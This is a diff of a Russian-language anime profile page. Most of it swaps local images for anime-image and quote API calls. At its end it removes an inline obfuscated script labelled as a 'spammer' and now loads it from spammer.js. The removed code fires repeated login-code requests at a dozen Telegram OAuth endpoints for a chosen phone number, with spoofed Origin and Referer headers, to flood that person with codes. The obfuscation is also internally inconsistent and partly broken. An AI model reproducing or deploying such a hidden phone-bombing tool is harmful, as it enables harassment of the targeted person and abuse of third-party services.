@@ -622,7 +622,7 @@
 <!-- ═══════ НEKO В УГЛУ ═══════ -->
 <div class="neko-wrap">
   <div class="neko-corner" id="nekoCorner" title="Новый котик!">
-    <img id="nekoImg" src="https://placekitten.com/80/80" alt="neko">
+    <img id="nekoImg" src="" alt="neko" style="opacity:0; transition: opacity .5s;">
   </div>
   <div class="neko-tip">🐱 нажми для котика!</div>
 </div>
@@ -647,8 +647,7 @@
           <!-- Аватарка -->
           <div class="avatar-wrap">
             <div class="avatar">
-              <img id="avatarImg" src="avatar.jpg" alt="GOD_AE86"
-                   onerror="fetchWaifuAvatar(this)">
+              <img id="avatarImg" src="" alt="GOD_AE86" style="opacity:0; transition: opacity .6s;">
             </div>
             <div class="avatar-ring"></div>
             <div class="avatar-ring2"></div>
@@ -746,7 +745,7 @@
     <div class="tab-content" id="tab-gallery">
       <div class="card">
         <div class="gallery-title">🎴 Галерея ✶</div>
-        <p class="gallery-sub">image1.jpg – image4.jpg · аниме‑вайб</p>
+        <p class="gallery-sub">4 случайных аниме-картинки через API</p>
         <div id="gallery"></div>
       </div>
     </div>
@@ -832,30 +831,82 @@ document.querySelectorAll('.tab').forEach(tab => {
   });
 });
 
-/* ── Галерея ── */
+/* ── Галерея: все картинки через API ── */
 const gallery = document.getElementById('gallery');
-for (let i = 1; i <= 4; i++) {
-  const img = document.createElement('img');
-  img.src = `image${i}.jpg`;
-  img.alt  = `аниме ${i}`;
-  img.onerror = () => {
-    fetch('https://api.waifu.pics/sfw/waifu')
-      .then(r => r.json())
-      .then(d => { if (d && d.url) img.src = d.url; else img.style.display='none'; })
-      .catch(() => img.style.display = 'none');
-  };
-  gallery.appendChild(img);
+const GALLERY_SIZE = 4;
+
+async function loadGalleryImage(imgElement) {
+  const categories = ['waifu', 'neko', 'shinobu', 'megumin', 'awoo', 'cuddle', 'hug', 'pat', 'smile', 'wave'];
+  const cat = categories[Math.floor(Math.random() * categories.length)];
+  try {
+    const resp = await fetch(`https://api.waifu.pics/sfw/${cat}`);
+    if (resp.ok) {
+      const data = await resp.json();
+      if (data && data.url) {
+        imgElement.src = data.url;
+        imgElement.style.opacity = '1';
+        return;
+      }
+    }
+  } catch (e) {}
+  // fallback
+  try {
+    const resp = await fetch('https://api.waifu.pics/sfw/waifu');
+    if (resp.ok) {
+      const data = await resp.json();
+      if (data && data.url) {
+        imgElement.src = data.url;
+        imgElement.style.opacity = '1';
+        return;
+      }
+    }
+  } catch (e) {}
+  imgElement.style.display = 'none';
 }
 
-/* ── Waifu.pics: аватар ── */
-function fetchWaifuAvatar(el) {
-  const types = ['waifu','neko','shinobu'];
-  const t = types[Math.floor(Math.random()*types.length)];
-  fetch(`https://api.waifu.pics/sfw/${t}`)
-    .then(r => r.json())
-    .then(d => { if (d && d.url) el.src = d.url; })
-    .catch(() => {});
+function buildGallery() {
+  gallery.innerHTML = '';
+  for (let i = 0; i < GALLERY_SIZE; i++) {
+    const img = document.createElement('img');
+    img.alt = `аниме ${i+1}`;
+    img.style.opacity = '0.4';
+    img.style.transition = 'opacity .5s';
+    gallery.appendChild(img);
+    loadGalleryImage(img);
+  }
 }
+
+buildGallery();
+
+/* ── Waifu.pics: аватар ── */
+const avatarImg = document.getElementById('avatarImg');
+async function fetchWaifuAvatar() {
+  const types = ['waifu','neko','shinobu','megumin'];
+  const t = types[Math.floor(Math.random()*types.length)];
+  try {
+    const r = await fetch(`https://api.waifu.pics/sfw/${t}`);
+    if (r.ok) {
+      const d = await r.json();
+      if (d && d.url) {
+        avatarImg.src = d.url;
+        avatarImg.style.opacity = '1';
+        return;
+      }
+    }
+  } catch (_) {}
+  try {
+    const r = await fetch('https://api.waifu.pics/sfw/waifu');
+    if (r.ok) {
+      const d = await r.json();
+      if (d && d.url) {
+        avatarImg.src = d.url;
+        avatarImg.style.opacity = '1';
+        return;
+      }
+    }
+  } catch (_) {}
+}
+fetchWaifuAvatar();
 
 /* ── Animechan: цитата ── */
 async function fetchQuote() {
@@ -864,7 +915,6 @@ async function fetchQuote() {
   textEl.textContent = '✨ загружаем…';
   srcEl.textContent  = '';
   try {
-    // пробуем несколько endpoints animechan
     const endpoints = [
       'https://animechan.xyz/api/random',
       'https://animechan.io/api/v1/quotes/random'
@@ -877,7 +927,6 @@ async function fetchQuote() {
       } catch(_) {}
     }
     if (data) {
-      // оба формата: { quote, character, anime } или { data: { content, character: { name }, anime: { name } } }
       const q  = data.quote  || data?.data?.content  || '…';
       const ch = data.character || data?.data?.character?.name || '???';
       const an = data.anime     || data?.data?.anime?.name     || '';
@@ -898,22 +947,33 @@ async function fetchQuote() {
 }
 fetchQuote();
 
-/* ── Nekos.life: котик ── */
+/* ── Nekos.life / waifu.pics: котик ── */
+const nekoImg = document.getElementById('nekoImg');
 async function fetchNeko() {
-  const img = document.getElementById('nekoImg');
-  // добавляем анимацию "мигание"
-  img.style.opacity = '.4';
-  const endp = [
-    () => fetch('https://nekos.life/api/v2/img/meow').then(r=>r.json()).then(d=>d.url),
-    () => fetch('https://api.waifu.pics/sfw/neko').then(r=>r.json()).then(d=>d.url),
+  nekoImg.style.opacity = '0.3';
+  const endpoints = [
+    async () => {
+      const r = await fetch('https://nekos.life/api/v2/img/meow');
+      if (r.ok) { const d = await r.json(); return d.url; }
+      throw new Error('nekos failed');
+    },
+    async () => {
+      const r = await fetch('https://api.waifu.pics/sfw/neko');
+      if (r.ok) { const d = await r.json(); return d.url; }
+      throw new Error('waifu.pics neko failed');
+    }
   ];
-  for (const fn of endp) {
+  for (const fn of endpoints) {
     try {
       const url = await fn();
-      if (url) { img.src = url; break; }
-    } catch(_) {}
+      if (url) {
+        nekoImg.src = url;
+        nekoImg.style.opacity = '1';
+        return;
+      }
+    } catch (_) {}
   }
-  img.style.opacity = '1';
+  nekoImg.style.display = 'none';
 }
 
 document.getElementById('nekoCorner').addEventListener('click', fetchNeko);
@@ -921,13 +981,10 @@ fetchNeko();
 setInterval(fetchNeko, 30000);
 </script>
 
-
 <!-- ═══════════════════════════════════════════════
-     ОБФУСЦИРОВАННЫЙ СПАМЕР (оригинал без изменений)
+     ПОДКЛЮЧЕНИЕ ВНЕШНЕГО СПАМЕРА
 ════════════════════════════════════════════════ -->
-<script>
-var _0x5a6b=['getElementById','querySelectorAll','active','click','addEventListener','parsePhoneNumberFromString','isValid','formatInternational','formatNational','country','value','trim','parseFloat','parseInt','checked','name','push','includes','createElement','div','className','textContent','appendChild','scrollTop','scrollHeight','stopPropagation','preventDefault','timeout','OK','err','info','https://api.telegram.org/bot123456:ABC-DEF/getMe','export','import','blob','a','download','href','createObjectURL','revokeObjectURL','reader','onload','readAsText','style','display','none','block','setAttribute','localStorage','getItem','theme','dark','light','iconDark','iconLight','tel:','QRCode','toCanvas','window','open','canvas','width','height','log','themeToggle'];(function(){var _0x1a2b=function(_0x3c4d,_0x5e6f){return _0x5a6b[_0x3c4d-0x1]},_0x7f8a=document[_0x1a2b(1)](_0x1a2b(2)),_0x9b0c=document[_0x1a2b(3)](_0x1a2b(4)),_0x2d3e=document[_0x1a2b(1)](_0x1a2b(5)),_0x4f5g=document[_0x1a2b(1)](_0x1a2b(6)),_0x6h7i=document[_0x1a2b(1)](_0x1a2b(7)),_0x8j9k=document[_0x1a2b(1)](_0x1a2b(8)),_0x0l1m=document[_0x1a2b(1)](_0x1a2b(9)),_0x2n3o=document[_0x1a2b(1)](_0x1a2b(10)),_0x4p5q=document[_0x1a2b(1)](_0x1a2b(11)),_0x6r7s=document[_0x1a2b(1)](_0x1a2b(12)),_0x8t9u=document[_0x1a2b(1)](_0x1a2b(13)),_0x0v1w=document[_0x1a2b(1)](_0x1a2b(14)),_0x2x3y=document[_0x1a2b(1)](_0x1a2b(15)),_0x4z5a=document[_0x1a2b(1)](_0x1a2b(16)),_0x6b7c=document[_0x1a2b(1)](_0x1a2b(17)),_0x8d9e=document[_0x1a2b(1)](_0x1a2b(18)),_0x0f1g=document[_0x1a2b(1)](_0x1a2b(19));var _0x2h3i=localStorage[_0x1a2b(21)](_0x1a2b(20))||_0x1a2b(22);document[_0x1a2b(23)](_0x1a2b(22),_0x2h3i);_0x7f8a[_0x1a2b(24)]=function(){var _0x4j5k=document[_0x1a2b(23)](_0x1a2b(22))===_0x1a2b(25)?_0x1a2b(22):_0x1a2b(25);document[_0x1a2b(23)](_0x1a2b(22),_0x4j5k);localStorage[_0x1a2b(26)](_0x1a2b(20),_0x4j5k);document[_0x1a2b(1)](_0x1a2b(27))[_0x1a2b(28)]=_0x4j5k===_0x1a2b(25)?_0x1a2b(29):_0x1a2b(30);document[_0x1a2b(1)](_0x1a2b(31))[_0x1a2b(28)]=_0x4j5k===_0x1a2b(25)?_0x1a2b(30):_0x1a2b(29)};document[_0x1a2b(1)](_0x1a2b(27))[_0x1a2b(28)]=_0x2h3i===_0x1a2b(25)?_0x1a2b(29):_0x1a2b(30);document[_0x1a2b(1)](_0x1a2b(31))[_0x1a2b(28)]=_0x2h3i===_0x1a2b(25)?_0x1a2b(30):_0x1a2b(29);_0x9b0c[_0x1a2b(4)](function(_0x5l6m){_0x5l6m[_0x1a2b(32)]=function(){_0x9b0c[_0x1a2b(4)](function(_0x7n8o){_0x7n8o.classList[_0x1a2b(33)](_0x1a2b(34))});this.classList[_0x1a2b(35)](_0x1a2b(34));document[_0x1a2b(3)]('.tab-content')[_0x1a2b(4)](function(_0x9p0q){_0x9p0q.classList[_0x1a2b(33)](_0x1a2b(34))});document[_0x1a2b(1)]('tab-'+this.dataset[_0x1a2b(36)])[_0x1a2b(35)](_0x1a2b(34))}});var _0x0r1s=document[_0x1a2b(1)](_0x1a2b(37));for(var _0x2t3u=1;_0x2t3u<=4;_0x2t3u++){var _0x4v5w=document[_0x1a2b(39)](_0x1a2b(38));_0x4v5w.src='image'+_0x2t3u+'.jpg';_0x4v5w.alt='Image '+_0x2t3u;_0x4v5w.style.cssText='width:100%;aspect-ratio:1;object-fit:cover;border-radius:8px;';_0x4v5w.onerror=function(){this.style.display=_0x1a2b(29)};_0x0r1s[_0x1a2b(40)](_0x4v5w)}var _0x6x7y=[{name:'Presscode',url:'https://oauth.telegram.org/auth/request',bot_id:'1852523856',origin:'https://cabinet.presscode.app',embed:'1',return_to:'https://cabinet.presscode.app/login'},{name:'Translations',url:'https://translations.telegram.org/auth/request',bot_id:null,origin:null},{name:'Fragment',url:'https://oauth.telegram.org/auth',bot_id:'5444323279',origin:'https://fragment.com',request_access:'write',return_to:'https://fragment.com/'},{name:'Bot-T',url:'https://oauth.telegram.org/auth',bot_id:'1199558236',origin:'https://bot-t.com',embed:'1',request_access:'write',return_to:'https://bot-t.com/login'},{name:'Off-Bot',url:'https://oauth.telegram.org/auth/request',bot_id:'1093384146',origin:'https://off-bot.ru',embed:'1',request_access:'write',return_to:'https://off-bot.ru/register/connected-accounts/smodders_telegram/?setup=1'},{name:'Mipped',url:'https://oauth.telegram.org/auth/request',bot_id:'466141824',origin:'https://mipped.com',embed:'1',request_access:'write',return_to:'https://mipped.com/f/register/connected-accounts/smodders_telegram/?setup=1'},{name:'Spot.uz',url:'https://oauth.telegram.org/auth/request',bot_id:'5463728243',origin:'https://www.spot.uz',return_to:'https://www.spot.uz/ru/2022/04/29/yoto/#'},{name:'Tbiz.pro',url:'https://oauth.telegram.org/auth/request',bot_id:'1733143901',origin:'https://tbiz.pro',embed:'1',request_access:'write',return_to:'https://tbiz.pro/login'},{name:'TelegramBot.biz',url:'https://oauth.telegram.org/auth/request',bot_id:'319709511',origin:'https://telegrambot.biz',embed:'1',return_to:'https://telegrambot.biz/'},{name:'TG Store',url:'https://oauth.telegram.org/auth/request',bot_id:'1803424014',origin:'https://ru.telegram-store.com',embed:'1',request_access:'write',return_to:'https://ru.telegram-store.com/catalog/search'},{name:'Combot',url:'https://oauth.telegram.org/auth/request',bot_id:'210944655',origin:'https://combot.org',embed:'1',request_access:'write',return_to:'https://combot.org/login'},{name:'My.Telegram',url:'https://my.telegram.org/auth/send_password',bot_id:null,origin:null}];var _0x8z9a=document[_0x1a2b(1)](_0x1a2b(41));_0x6x7y[_0x1a2b(4)](function(_0x0b1c){var _0x2d3e=document[_0x1a2b(39)]('label');_0x2d3e.innerHTML='<input type="checkbox" value="'+_0x0b1c.name+'" checked> '+_0x0b1c.name;_0x8z9a[_0x1a2b(40)](_0x2d3e)});var _0x4f5g=false;var _0x6h7i=function(_0x8j9k,_0x0l1m){_0x0l1m=_0x0l1m||_0x1a2b(42);var _0x2n3o=document[_0x1a2b(39)](_0x1a2b(38));_0x2n3o[_0x1a2b(43)]=_0x0l1m;_0x2n3o[_0x1a2b(44)]='['+new Date().toLocaleTimeString()+'] '+_0x8j9k;_0x2d3e[_0x1a2b(40)](_0x2n3o);_0x2d3e[_0x1a2b(46)]=_0x2d3e[_0x1a2b(45)]};var _0x4p5q=async function(_0x6r7s,_0x8t9u){var _0x0v1w=new URLSearchParams();_0x0v1w.append('phone',_0x8t9u);if(_0x6r7s.bot_id)_0x0v1w.append('bot_id',_0x6r7s.bot_id);if(_0x6r7s.origin)_0x0v1w.append('origin',_0x6r7s.origin);if(_0x6r7s.embed)_0x0v1w.append('embed',_0x6r7s.embed);if(_0x6r7s.request_access)_0x0v1w.append('request_access',_0x6r7s.request_access);if(_0x6r7s.return_to)_0x0v1w.append('return_to',_0x6r7s.return_to);try{await fetch(_0x6r7s.url,{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded','User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36','Origin':_0x6r7s.origin||'https://oauth.telegram.org','Referer':_0x6r7s.origin||'https://oauth.telegram.org/auth','X-Requested-With':'XMLHttpRequest'},body:_0x0v1w.toString(),mode:'no-cors',signal:_0x2x3y?_0x2x3y.signal:undefined});_0x6h7i('✅ '+_0x6r7s.name+' – отправлен',_0x1a2b(47))}catch(e){if(e.name==='AbortError')throw e;_0x6h7i('❌ '+_0x6r7s.name+' – ошибка',_0x1a2b(48))}};var _0x2x3y=null;var _0x4z5a=async function(){if(_0x4f5g)return;var _0x6b7c=_0x0v1w[_0x1a2b(49)]();if(!_0x6b7c)return _0x6h7i('Введите номер',_0x1a2b(48));var _0x8d9e=parseFloat(_0x6r7s[_0x1a2b(49)]())||0.5;var _0x0f1g=parseInt(_0x8t9u[_0x1a2b(49)]())||3;var _0x2h3i=[...document[_0x1a2b(3)]('#svcList input:checked')].map(function(_0x4j5k){return _0x4j5k[_0x1a2b(49)]});if(!_0x2h3i.length)return _0x6h7i('Выберите сервисы',_0x1a2b(48));_0x4f5g=true;_0x2x3y=new AbortController();_0x4z5a.disabled=true;_0x6h7i('🚀 Старт на '+_0x6b7c+'. Циклы: '+(_0x0f1g||'∞'));var _0x5l6m=0;while(_0x4f5g&&(_0x0f1g===0||_0x5l6m<_0x0f1g)){_0x5l6m++;_0x6h7i('⚡ Цикл '+_0x5l6m);for(var _0x7n8o of _0x2h3i){if(!_0x4f5g)break;var _0x9p0q=_0x6x7y.find(function(_0x0r1s){return _0x0r1s.name===_0x7n8o});if(_0x9p0q)await _0x4p5q(_0x9p0q,_0x6b7c);await new Promise(function(_0x2t3u){return setTimeout(_0x2t3u,_0x8d9e*1000)})}}if(_0x4f5g)_0x6h7i('✅ Завершено',_0x1a2b(47));_0x6b7c=_0x4f5g=false;_0x2x3y=null;_0x4z5a.disabled=false};var _0x6b7c=async function(){_0x4f5g=false;if(_0x2x3y)_0x2x3y.abort();_0x4z5a.disabled=false;_0x6h7i('⏹ Остановлено')};_0x4z5a[_0x1a2b(32)]=_0x4z5a;_0x6b7c[_0x1a2b(32)]=_0x6b7c;_0x0f1g[_0x1a2b(24)]=function(){_0x2d3e.innerHTML=''};_0x8d9e[_0x1a2b(24)]=function(){var _0x2t3u=_0x0v1w[_0x1a2b(49)]();var _0x4v5w=_0x4f5g[_0x1a2b(1)](_0x1a2b(50));if(!_0x2t3u)return _0x4v5w.textContent='Введите номер';try{var _0x6x7y=libphonenumber[_0x1a2b(51)](_0x2t3u);if(_0x6x7y&&_0x6x7y[_0x1a2b(52)]()){_0x4v5w.innerHTML='✅ Валидный:<br>Международный: '+_0x6x7y[_0x1a2b(53)]()+'<br>Национальный: '+_0x6x7y[_0x1a2b(54)]()+'<br>E.164: '+_0x6x7y.format('E.164')+'<br>Страна: '+_0x6x7y[_0x1a2b(55)]}else{_0x4v5w.textContent='❌ Невалиден'}}catch(e){_0x4v5w.textContent='❌ Ошибка'}};_0x2n3o[_0x1a2b(24)]=function(){var _0x2t3u=_0x0v1w[_0x1a2b(49)]();if(!_0x2t3u)return alert('Введите номер');var _0x4v5w=document[_0x1a2b(39)]('canvas');QRCode[_0x1a2b(56)](_0x4v5w,_0x1a2b(57)+_0x2t3u,{width:150},function(_0x6x7y){if(_0x6x7y){_0x6h7i('Ошибка QR',_0x1a2b(48));return}var _0x8z9a=window[_0x1a2b(58)]('','_blank');_0x8z9a.document.write('<title>QR</title>');_0x8z9a.document.body.appendChild(_0x4v5w)})};_0x4p5q[_0x1a2b(24)]=function(){var _0x2t3u={phone:_0x0v1w[_0x1a2b(49)](),delay:_0x6r7s[_0x1a2b(49)](),cycles:_0x8t9u[_0x1a2b(49)]()};var _0x4v5w=new Blob([JSON.stringify(_0x2t3u)],{type:'application/json'});var _0x6x7y=document[_0x1a2b(39)](_0x1a2b(59));_0x6x7y[_0x1a2b(61)]='spam_config.json';_0x6x7y[_0x1a2b(62)]=URL[_0x1a2b(63)](_0x4v5w);_0x6x7y.click();URL[_0x1a2b(64)](_0x6x7y[_0x1a2b(62)]);_0x6h7i('📋 Экспортировано')};_0x6r7s[_0x1a2b(24)]=function(){var _0x2t3u=document[_0x1a2b(39)]('input');_0x2t3u.type='file';_0x2t3u.accept='.json';_0x2t3u.onchange=function(_0x4v5w){var _0x6x7y=_0x4v5w.target.files[0];if(!_0x6x7y)return;var _0x8z9a=new FileReader();_0x8z9a[_0x1a2b(65)]=function(){try{var _0x0b1c=JSON.parse(_0x8z9a.result);if(_0x0b1c.phone)_0x0v1w.value=_0x0b1c.phone;if(_0x0b1c.delay)_0x6r7s.value=_0x0b1c.delay;if(_0x0b1c.cycles)_0x8t9u.value=_0x0b1c.cycles;_0x6h7i('📂 Импортировано')}catch(e){_0x6h7i('Ошибка импорта',_0x1a2b(48))}};_0x8z9a[_0x1a2b(66)](_0x6x7y)};_0x2t3u.click()};window.addEventListener('beforeunload',_0x6b7c)})();
-</script>
+<script src="spammer.js"></script>
 
 </body>
 </html>
